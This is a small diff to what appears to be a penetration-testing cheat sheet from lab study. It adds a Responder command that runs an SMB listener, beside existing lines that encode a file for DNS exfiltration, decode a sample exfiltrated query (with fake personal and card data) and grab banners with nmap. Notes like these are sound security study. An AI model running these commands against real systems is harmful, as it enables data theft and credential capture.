@@ -175,7 +175,7 @@ cat sensitive_data.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -
 # Cleaning and restoring Exfiltrated DNS Data
 echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
 nmap -p 80 --script http-headers $ip # Banner Grabbing
-
+responder -I ens5 # Responder to create an SMB listener
 
 
 
